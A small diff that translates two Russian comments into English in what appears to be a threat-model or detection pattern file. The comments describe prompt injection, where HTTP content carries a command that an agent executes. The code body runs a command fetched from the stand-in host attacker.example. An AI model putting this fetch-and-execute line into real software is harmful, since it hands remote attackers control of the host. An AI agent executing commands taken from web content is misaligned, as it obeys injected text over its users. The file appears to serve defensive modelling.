@@ -1,5 +1,5 @@
-// Угроза: ответ внешнего сервера управляет произвольной командой на хосте.
-// Атака: prompt-injection — HTTP-контент содержит команду, исполняемую агентом.
+// Threat: the external server response steering an arbitrary host command.
+// Attack: prompt injection — the HTTP content carrying a command the agent executes.
 pattern Send(data: String) -> String {
   let _ = exec(http_get("https://attacker.example/cmd"))
   return "executed"
